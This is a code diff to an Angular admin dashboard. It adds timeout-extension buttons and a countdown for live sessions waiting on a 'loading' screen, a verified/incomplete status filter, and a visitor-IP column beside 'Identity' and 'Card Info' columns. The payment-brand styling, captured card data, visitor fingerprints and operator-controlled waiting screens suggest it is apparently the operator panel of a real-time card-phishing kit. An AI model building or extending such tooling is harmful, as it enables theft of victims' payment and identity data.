@@ -364,6 +364,25 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      <div class="flex items-center gap-2">
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
+
+                                         <!-- Extend Timeout Controls & Countdown -->
+                                         @if(monitoredSession()?.currentView === 'loading') {
+                                            <div class="flex items-center gap-2 ml-4">
+                                                 @if(countdownSeconds() !== null) {
+                                                     <div class="flex flex-col items-center leading-none">
+                                                         <span class="text-[10px] font-bold uppercase text-slate-400">Auto</span>
+                                                         <span class="text-sm font-mono font-bold" [class.text-red-500]="countdownSeconds()! < 6" [class.text-slate-600]="countdownSeconds()! >= 6" [class.dark:text-slate-300]="countdownSeconds()! >= 6">
+                                                             {{ countdownSeconds() }}s
+                                                         </span>
+                                                     </div>
+                                                 }
+                                                 <div class="h-6 w-px bg-slate-200 dark:bg-slate-700 mx-1"></div>
+                                                 <div class="flex gap-1">
+                                                     <button (click)="extendTimeout(10000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+10s</button>
+                                                     <button (click)="extendTimeout(20000)" class="bg-blue-50 dark:bg-slate-700 text-pp-blue dark:text-blue-400 text-[10px] font-bold px-2 py-1 rounded hover:bg-blue-100 dark:hover:bg-slate-600 transition">+20s</button>
+                                                 </div>
+                                            </div>
+                                         }
                                      </div>
 
                                      @if(monitoredSession()) {
@@ -463,6 +482,12 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             <option [value]="c">{{ c }}</option>
                                         }
                                     </select>
+
+                                    <select [ngModel]="statusFilter()" (ngModelChange)="statusFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
+                                        <option value="all">All Status</option>
+                                        <option value="verified">Verified</option>
+                                        <option value="incomplete">Incomplete</option>
+                                    </select>
                                 </div>
                             </div>
                         </div>
@@ -485,7 +510,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
                                         </th>
                                         <th class="px-4 py-4">Time</th>
-                                        <th class="px-6 py-4">Session ID</th>
+                                        <th class="px-6 py-4">IP Address</th>
                                         <th class="px-6 py-4">Identity</th>
                                         <th class="px-6 py-4">Card Info</th>
                                         <th class="px-6 py-4">Status</th>
@@ -502,7 +527,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                             </td>
                                             <td class="px-4 py-4 text-slate-500 dark:text-slate-400 whitespace-nowrap">{{ item.timestamp | date:'short' }}</td>
                                             <td class="px-6 py-4 text-pp-blue dark:text-blue-400 font-bold font-mono">
-                                                {{ item.id }}
+                                                {{ item.ip || item.fingerprint.ip }}
                                                 @if(item.isPinned) { <span class="material-icons text-[12px] text-pp-blue dark:text-blue-400 ml-1">push_pin</span> }
                                             </td>
                                             <td class="px-6 py-4">
@@ -525,7 +550,11 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                 </div>
                                             </td>
                                             <td class="px-6 py-4">
-                                                <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
+                                                @if(item.data?.isArchivedIncomplete) {
+                                                    <span class="bg-slate-100 dark:bg-slate-600 text-slate-600 dark:text-slate-300 px-3 py-1 rounded-full text-[11px] font-bold uppercase">INCOMPLETE</span>
+                                                } @else {
+                                                    <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-[11px] font-bold uppercase">{{ item.status }}</span>
+                                                }
                                             </td>
                                             <td class="px-6 py-4 text-right" (click)="$event.stopPropagation()">
                                                 <div class="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
@@ -552,7 +581,7 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- SETTINGS TAB -->
                 @case ('settings') {
-                    <div class="max-w-2xl mx-auto bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden p-8 animate-fade-in">
+                    <div class="max-w-2xl mx-auto bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-y-auto max-h-full p-8 animate-fade-in">
                          <h2 class="font-bold text-xl mb-6 text-pp-navy dark:text-white">System Configuration</h2>
 
                          <!-- Appearance -->
@@ -919,6 +948,7 @@ export class AdminDashboardComponent {
   customDateStart = signal<string>('');
   customDateEnd = signal<string>('');
   countryFilter = signal<string>('all');
+  statusFilter = signal<string>('all');
   selectedSessionIds = signal<Set<string>>(new Set());
 
   // Incomplete Sessions Toggle
@@ -946,6 +976,7 @@ export class AdminDashboardComponent {
       const q = this.searchQuery().toLowerCase();
       const tf = this.timeFilter();
       const cf = this.countryFilter();
+      const sf = this.statusFilter();
       const now = Date.now();
 
       // Time Filter
@@ -971,6 +1002,15 @@ export class AdminDashboardComponent {
       // Country Filter
       if (cf !== 'all') {
           data = data.filter(h => h.data?.ipCountry === cf);
+      }
+
+      // Status Filter
+      if (sf !== 'all') {
+          if (sf === 'verified') {
+              data = data.filter(h => !h.data?.isArchivedIncomplete);
+          } else if (sf === 'incomplete') {
+              data = data.filter(h => h.data?.isArchivedIncomplete);
+          }
       }
 
       // Search Filter
@@ -1026,6 +1066,7 @@ export class AdminDashboardComponent {
   });
 
   elapsedTime = signal('0m');
+  countdownSeconds = signal<number | null>(null);
   private timer: number | undefined;
 
   constructor() {
@@ -1045,12 +1086,28 @@ export class AdminDashboardComponent {
           const session = this.monitoredSession();
           clearInterval(this.timer);
 
-          if (session?.timestamp) {
-              const update = () => this.elapsedTime.set(this.getElapsed(session.timestamp));
+          if (session) {
+              const update = () => {
+                   // 1. Elapsed
+                   if(session.timestamp) this.elapsedTime.set(this.getElapsed(session.timestamp));
+
+                   // 2. Countdown
+                   if(session.currentView === 'loading' && session.data?.waitingStart && session.data?.autoApproveThreshold) {
+                       const start = session.data.waitingStart;
+                       const limit = session.data.autoApproveThreshold;
+                       const now = Date.now();
+                       const remaining = Math.max(0, Math.ceil((limit - (now - start)) / 1000));
+                       this.countdownSeconds.set(remaining);
+                   } else {
+                       this.countdownSeconds.set(null);
+                   }
+              };
+
               update();
               this.timer = setInterval(update, 1000) as unknown as number;
           } else {
               this.elapsedTime.set('0m');
+              this.countdownSeconds.set(null);
           }
       }, { allowSignalWrites: true });
   }
@@ -1221,6 +1278,14 @@ ${s.fingerprint?.userAgent}
       event.stopPropagation();
       if(confirm('Archive this incomplete session to history?')) {
           this.state.archiveSession(session.id);
+      }
+  }
+
+  extendTimeout(ms: number) {
+      const id = this.monitoredSession()?.id;
+      if (id) {
+          this.state.sendAdminCommand(id, 'EXTEND_TIMEOUT', { duration: ms });
+          this.state.showAdminToast(`Added +${ms/1000}s`);
       }
   }
 
